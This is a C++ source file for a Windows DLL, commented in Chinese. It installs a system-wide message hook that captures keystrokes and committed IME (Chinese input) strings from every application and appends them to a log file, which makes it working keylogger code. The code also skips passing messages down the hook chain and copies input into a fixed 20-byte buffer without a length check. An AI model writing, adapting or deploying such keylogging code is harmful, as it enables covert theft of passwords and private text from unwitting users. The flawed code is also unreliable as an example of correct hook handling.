// HookKeyBoard.cpp : Defines the entry point for the DLL application.
//

#include "stdafx.h"
#include "imm.h"
#include "stdio.h"

#include "HookKeyBoard.h"

#pragma comment(lib, "imm32.lib")

HHOOK g_hHook = NULL; //hook句柄
HINSTANCE g_hHinstance = NULL; //程序句柄

FILE *f1 = NULL;

BOOL APIENTRY DllMain( HANDLE hModule, 
					  DWORD  ul_reason_for_call, 
					  LPVOID lpReserved
					  )
{
	switch (ul_reason_for_call)
	{
	case DLL_PROCESS_ATTACH:
		g_hHinstance = (HINSTANCE)hModule;
		break;
	case DLL_THREAD_ATTACH:
		break;
	case DLL_THREAD_DETACH:
		break;
	case DLL_PROCESS_DETACH:
		UnHook();
		break;
	}
	return TRUE;
}


LRESULT CALLBACK MessageProc(int nCode,WPARAM wParam,LPARAM lParam)
{ 
	LRESULT lResult = 1;
	HIMC hIMC;

		DWORD dwSize;
		char ch;
		char lpstr[20];
	//LRESULT lResult = CallNextHookEx(g_hHook, nCode, wParam, lParam);
	PMSG pmsg = (PMSG)lParam;
	HWND hWnd=pmsg->hwnd;
	if (nCode == HC_ACTION)
	{	
		
		//	switch (wParam)
		switch (pmsg->message)
		{
		case WM_IME_CHAR:
		case WM_IME_COMPOSITION:
			{
				
				if(pmsg->lParam & GCS_RESULTSTR)
				{
					//先获取当前正在输入的窗口的输入法句柄
					hIMC = ImmGetContext(hWnd);
					if (!hIMC)
					{
						MessageBox(NULL, "ImmGetContext", "ImmGetContext", MB_OK);
					}
					
					// 先将ImmGetCompositionString的获取长度设为0来获取字符串大小.
					dwSize = ImmGetCompositionString(hIMC, GCS_RESULTSTR, NULL, 0);
					
					// 缓冲区大小要加上字符串的NULL结束符大小,
					// 考虑到UNICODE
					dwSize += sizeof(WCHAR);
					
					memset(lpstr, 0, 20);
					
					// 再调用一次.ImmGetCompositionString获取字符串
					ImmGetCompositionString(hIMC, GCS_RESULTSTR, lpstr, dwSize);
					
					//现在lpstr里面即是输入的汉字了。你可以处理lpstr,当然也可以保存为文件...
					//MessageBox(NULL, lpstr, lpstr, MB_OK); 
					fwrite(lpstr, strlen(lpstr), 1, f1);
					ImmReleaseContext(hWnd, hIMC);
					fflush(f1);
				}
				
				break;
			}
			
		case WM_CHAR: //截获发向焦点窗口的键盘消息
			{
				ch=(char)(pmsg->wParam);
				fwrite(&ch, 1, 1, f1);
				
				fflush(f1);
				break;
			}
		default:
			break;
			
		}/* end switch */
	}
	
	return lResult;
}


DLL_API BOOL InstallHook(const char* lpFilePathName)
{
	g_hHook = SetWindowsHookEx(WH_GETMESSAGE, (HOOKPROC)MessageProc, g_hHinstance, 0);
	f1 = fopen(lpFilePathName,"a+");
	if ((f1 == NULL) || (g_hHook == NULL))
	{
		return FALSE;
	}
	return TRUE;
}

DLL_API BOOL UnHook()
{ 
	fclose(f1);
	return UnhookWindowsHookEx(g_hHook);
} 